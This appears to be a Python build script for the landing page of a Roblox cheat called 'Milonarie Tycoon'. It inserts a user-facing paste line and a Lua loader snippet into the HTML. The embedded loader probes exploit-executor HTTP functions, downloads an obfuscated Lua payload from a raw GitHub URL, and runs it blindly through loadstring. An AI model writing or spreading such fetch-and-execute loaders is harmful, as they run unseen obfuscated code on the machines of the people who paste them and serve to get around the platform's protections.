#!/usr/bin/env python3
"""Aero :: Milonarie Tycoon :: rellena la landing con la linea de paste real.

La landing tiene marcadores __PASTE_LINE__ y __LOADER_SNIPPET__; este script
los sustituye por el contenido actual de release/paste_line.txt y por un
extracto legible del cliente HTTP del loader.

    .venv/bin/python tools/build_landing.py
"""
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
LANDING = ROOT / "release" / "landing.html"
PASTE = ROOT / "release" / "paste_line.txt"
LOADER = ROOT.parents[1] / "loader.lua"

SNIPPET = """-- VANTA | MILONARIE TYCOON :: loader
local PAYLOAD_URL = "https://raw.githubusercontent.com/maneulgonzalez1012-cyber/vvv/arena/5e9deb5f-vvv/roblox/milonarie_tycoon/release/milonarie_tycoon_obfuscated_compact.lua"

-- request / http_request / syn.request / http.request y, como ultimo
-- recurso, game:HttpGet. Cada uno devuelve el body de forma distinta, asi
-- que se normaliza la respuesta.
local function fetch(url)
  local function body(r, extra)
    if type(r) == "string" and #r > 0 then return r end
    if type(r) == "table" then
      local b = r.Body or r.body
      if type(b) == "string" and #b > 0 then return b end
    end
    if type(extra) == "string" and #extra > 0 then return extra end
    return nil
  end
  local fns = {}
  if type(request) == "function" then fns[#fns+1] = request end
  if type(http_request) == "function" then fns[#fns+1] = http_request end
  if type(syn) == "table" and type(syn.request) == "function" then fns[#fns+1] = syn.request end
  if type(http) == "table" and type(http.request) == "function" then fns[#fns+1] = http.request end
  for _, fn in ipairs(fns) do
    local ok, a = pcall(fn, { Url = url, Method = "GET" })
    if ok then local b = body(a) if b then return b end end
    local ok2, a2 = pcall(fn, url)
    if ok2 then local b = body(a2) if b then return b end end
  end
  local ok, a = pcall(function() return game:HttpGet(url) end)
  if ok then local b = body(a) if b then return b end end
  return nil
end

local source = fetch(PAYLOAD_URL)
if not source then error("[VANTA] no se pudo descargar el payload") end

local chunk, err
if type(loadstring) == "function" then chunk, err = loadstring(source) end
if not chunk and type(load) == "function" then chunk, err = load(source) end
if not chunk then error("[VANTA] el payload no compila: " .. tostring(err)) end

chunk()"""


def escape(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def main() -> int:
    paste = PASTE.read_text(encoding="utf-8").strip()
    html = LANDING.read_text(encoding="utf-8")
    if "__PASTE_LINE__" not in html or "__LOADER_SNIPPET__" not in html:
        print("la landing no tiene los marcadores esperados")
        return 2
    html = html.replace("__PASTE_LINE__", escape(paste))
    html = html.replace("__LOADER_SNIPPET__", escape(SNIPPET))
    LANDING.write_text(html, encoding="utf-8")
    print(f"landing: {len(html.encode('utf-8'))} bytes, linea de paste de {len(paste)} bytes")
    return 0


if __name__ == "__main__":
    sys.exit(main())
